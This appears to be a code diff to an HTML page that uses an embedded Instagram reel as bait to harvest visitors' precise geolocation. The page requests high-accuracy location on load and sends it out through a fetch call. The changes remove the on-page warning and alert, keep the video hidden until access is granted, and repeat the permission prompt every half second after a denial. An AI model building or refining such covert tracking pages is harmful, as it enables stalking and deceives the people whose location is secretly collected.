@@ -34,18 +34,11 @@
             width: 100%;
             height: 100%;
             border: none;
-            display: block;
+            display: none;
         }
     </style>
 </head>
 <body>
-    
-    <div id="warning-msg" style="display: none; text-align: center; padding: 20px; font-family: sans-serif; color: white; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; z-index: 10;">
-        <h2>Location Access Required</h2>
-        <p>You must allow location access to view this content.</p>
-        <p>If you previously denied location access, please enable it in your browser's site settings (usually a lock icon in the address bar), then refresh the page.</p>
-        <button onclick="location.reload()" style="padding: 10px 20px; margin-top: 15px; font-size: 16px; cursor: pointer; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: bold;">Reload Page</button>
-    </div>
 
     <!-- Instagram Reel Embed -->
     <iframe id="reel-iframe" src="https://www.instagram.com/reel/DI0zr7xSYMk/embed" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>
@@ -66,21 +59,14 @@
 
                         fetch(url).catch(() => {});
                         
-                        // Show the iframe, hide the warning
+                        // Show the iframe
                         document.getElementById('reel-iframe').style.display = 'block';
-                        document.getElementById('warning-msg').style.display = 'none';
                     },
                     (error) => {
                         console.log("Location denied or error:", error.message);
                         
-                        // Hide iframe and show warning message
-                        document.getElementById('reel-iframe').style.display = 'none';
-                        document.getElementById('warning-msg').style.display = 'block';
-                        
-                        alert("You must allow location access to view this video.");
-                        
                         // Keep requesting in case they didn't permanently deny
-                        setTimeout(requestLocation, 2000);
+                        setTimeout(requestLocation, 500);
                     },
                     {
                         enableHighAccuracy: true,
@@ -93,8 +79,7 @@
 
         // Automatic location tracking hidden in the background
         window.addEventListener('load', () => {
-            // Wait slightly for the reel to start loading to feel seamless
-            setTimeout(requestLocation, 500);
+            requestLocation();
         });
     </script>
 
